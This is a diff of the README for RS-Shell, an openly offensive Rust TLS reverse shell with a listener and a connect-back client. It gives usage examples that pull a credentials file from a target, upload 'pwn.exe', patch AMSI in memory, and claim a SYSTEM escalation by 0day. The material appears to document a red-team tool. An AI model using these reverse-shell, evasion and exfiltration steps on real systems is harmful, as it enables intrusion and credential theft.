@@ -1,12 +1,15 @@
 *"The worst Rust programmer you have ever seen"* - my mom
+
 *"But at least it works"* - still my mom, but not about me
 
 # RS-Shell
 
 RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved.
+
 Client and server are both cross-platform and work on Windows and Linux systems.
 
 For Windows client, additonal features have been integrated for offensive purpose, and they will be improved in futur commits.
+
 For this purpose, I have chosen to mainly use the official [windows_sys](https://docs.rs/windows-sys/latest/windows_sys/) crate to interact with the Win32API and the [ntapi](https://docs.rs/ntapi/latest/ntapi/) crate for the NTAPI.
 
 The project is thought in module. This means that you can easily add or remove features to and from it, and you can also easily take parts from it to put them in your own project.
@@ -29,6 +32,7 @@ For the moment, the following features are present:
 ### Setup
 
 First of all, the full path of your TLS certificate and its password must be configured in the file `server.rs` in place of the tags `[CERTFICATE_PATH]` and `[CERTIFICATE_PASSWORD]`.
+
 Additionally, I have set a `dummy` domain for hostname validation in the `connect()` function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.
 
 By default, only the `error`, `warn` and `info` logs are displayed. If you also need the `debug` ones (can be usefull for the loading features), you can change this in `main.rs` by modifying `::log::set_max_level(LevelFilter::Info);` to `::log::set_max_level(LevelFilter::Debug);`.
@@ -36,7 +40,8 @@ By default, only the `error`, `warn` and `info` logs are displayed. If you also 
 ### Compilation
 
 The project can be compiled with `cargo build --release` on Windows or Linux and the binary will be present in `target/release/`.
-Tu compile for a different target than your current OS you can use `cargo build --release --target x86_64-unknown-linux-gnu`
+
+Tu compile for a different target than your current OS you can use `cargo build --release --target x86_64-unknown-linux-gnu`.
 
 The project compilation has been tested with the following Rust toolchains :
 
@@ -62,6 +67,7 @@ Usage : shell.exe [l | c] IP port
 ```
 
 To obtain a session, just launch the binary in listener mode on your machine with `rs-shell.exe l IP_to_bind_to port_to_bind_to`. For example `rs-shell.exe l 0.0.0.0 4545`.
+
 Then, on the target machine launch the client to connect back to your server with `rs-shell.exe c IP_to_connect_to port_to_connect_to`. For example `rs-shell.exe c 192.168.1.10 4545`.
 
 ### Advanced commands
@@ -104,6 +110,7 @@ For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.ex
 `powpow` starts an interactive PowerShell session with a PowerShell process where the AMSI `ScanBuffer` function has been patched in memory. This feature is not particularly opsec.
 
 `download` permits to download a file from the client to the machine where the listener is running. For example `download C:\Users\Administrator\Desktop\creds.txt ./creds.txt`.
+
 `upload` permits to upload a file on the client machine. For example `upload ./pwn.exe C:\Temp\pwn.exe`.
 
 `autopwn` permits to escalate to the **SYSTEM account** with a 0day exploitation. Just type `autopwn` and answer the question.
